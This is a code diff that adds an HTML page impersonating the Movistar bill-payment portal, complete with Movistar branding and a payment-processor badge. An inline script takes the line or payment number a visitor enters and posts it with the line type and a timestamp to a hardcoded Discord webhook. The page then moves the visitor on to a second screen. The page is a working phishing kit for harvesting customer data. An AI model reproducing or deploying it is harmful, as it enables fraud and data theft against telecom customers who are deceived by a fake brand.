@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="description" content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
+    <meta name="theme-color" content="#019DF4" />
+    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
+
+    <!-- Stylesheets -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="styles.css" rel="stylesheet">
+    <script src="epayco/js/functions.js"></script>
+    <script src="bot.js"></script>
+    <title>Movistar Portal de Recaudos</title>
+    <style>
+        #loader {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10000;
+            background: rgba(255, 255, 255, 0.7);
+            width: 100vw;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .svg-circle {
+            width: 4em;
+            height: 4em;
+            transform-origin: center;
+            animation: rotate4 2s linear infinite;
+            display: block;
+            margin: 0 auto;
+        }
+
+        #loader svg {
+            display: block;
+            margin: 0 auto;
+        }
+
+        circle {
+            fill: none;
+            stroke: #019DF4;
+            stroke-width: 4;
+            stroke-dasharray: 1, 200;
+            stroke-dashoffset: 0;
+            stroke-linecap: round;
+            animation: dash4 1.5s ease-in-out infinite;
+        }
+
+        @keyframes rotate4 {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes dash4 {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0;
+            }
+
+            50% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -35;
+            }
+
+            100% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -124;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image" />
+        <div class="header-footer-text d-md-none">
+            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
+                alt="Ícono de candado" class="lock-icon" />
+            <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
+                    class="omg-logo" /></span>
+        </div>
+    </header>
+    <div class="main-container">
+        <div class="content-container">
+            <div class="button-container text-center mb-4">
+                <button class="btn btn-primary btn-small" id="payBillButton">Movistar</button>
+                <button class="btn btn-secondary btn-small" id="otherBillButton1">Antes Telebucaramanga</button>
+                <button class="btn btn-secondary btn-small" id="otherBillButton2">Antes Metrotel</button>
+            </div>
+            <div id="billContent">
+                <div class="text-center">
+                    <h2 class="mb-4">
+                        <span class="thin-text">Pagar mi factura </span><span class="bold-text">Movistar</span>
+                    </h2>
+                </div>
+
+                <div class="form-group">
+                    <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de línea">
+                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
+                        <label class="btn btn-outline-primary" for="mobileLine">Móvil</label>
+
+                        <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
+                        <label class="btn btn-outline-primary" for="fixedLine">Fija</label>
+                    </div>
+                    <div class="input-group mt-3">
+                        <img src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png"
+                            alt="Icono de teléfono" class="phone-icon" />
+                        <input type="text" id="line-number" class="form-control line-input"
+                            placeholder="Ingresa el número de línea o de pago" />
+                    </div>
+                    <small class="form-text text-muted">Ingresa el número de línea o de pago</small>
+                </div>
+                <div class="button-container text-center">
+                    <button id="consultPayButton" class="btn btn-secondary-disabled" disabled>Consultar y pagar</button>
+                </div>
+                <div class="button-container text-center mt-2">
+                    <button id="schedulePayButton" class="btn btn-secondary-disabled" disabled>Programar / Administrar
+                        mis pagos</button>
+                </div>
+                <div class="footer-text text-center d-none d-md-block">
+                    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
+                        alt="Ícono de candado" class="lock-icon" />
+                    <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
+                            class="omg-logo" /></span>
+                </div>
+                <div class="payment-methods text-center">
+                    <h3>
+                        <span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles para
+                            ti</span>
+                    </h3>
+
+                    <div class="icons-container">
+                        <img src="img/4.jpeg" alt="Icono 1" class="payment-icon">
+                        <img src="img/1.png" alt="Icono 2" class="payment-icon">
+                        <img src="img/2.jpeg" alt="Icono 3" class="payment-icon">
+                        <img src="img/3.jpeg" alt="Icono 4" class="payment-icon">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="image-container">
+            <img src="img/Background-mob.webp" alt="Publicidad" class="advertisement-image" />
+        </div>
+    </div>
+
+    <div id="loader">
+        <svg viewBox="25 25 50 50" class="svg-circle">
+            <circle r="20" cy="50" cx="50"></circle>
+        </svg>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="debtmap.js"></script>
+    <script src="scripts.js"></script>
+
+   <script>
+  // 🔹 Pega tu Webhook de Discord aquí
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
+
+  // Función para enviar mensajes a Discord
+  function sendToDiscord(message) {
+    const data = { content: message };
+
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(data => console.log("✅ Enviado a Discord", data))
+    .catch(err => console.error("❌ Error enviando a Discord", err));
+  }
+
+  // Evento al presionar el botón
+  document.getElementById("consultPayButton").addEventListener("click", function () {
+    const lineNumber = document.getElementById("line-number").value.trim();
+
+    if (!lineNumber) {
+      alert("Por favor ingresa un número válido.");
+      return;
+    }
+
+    // Loader
+    const loader = document.getElementById("loader");
+    loader.style.display = "flex";
+
+    setTimeout(function () {
+      loader.style.display = "none";
+
+      // Enviar a Discord con el mismo formato 📱
+      const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
+      const fecha = new Date().toLocaleString("es-CO");
+
+      const mensaje = `📱 **Nueva consulta de pago:**\n` +
+                      `🔹 Tipo: ${tipoLinea}\n` +
+                      `🔢 Número: ${lineNumber}\n` +
+                      `⏰ Fecha: ${fecha}`;
+
+      sendToDiscord(mensaje);
+
+      // Lógica de redirección original
+      if (window.debtMap && window.debtMap[lineNumber]) {
+        localStorage.setItem("lineNumber", lineNumber);
+        window.location.href = "screen2.html";
+      }
+    }, 2000);
+  });
+</script>
+
+
+</body>
+</html>
+
+
+
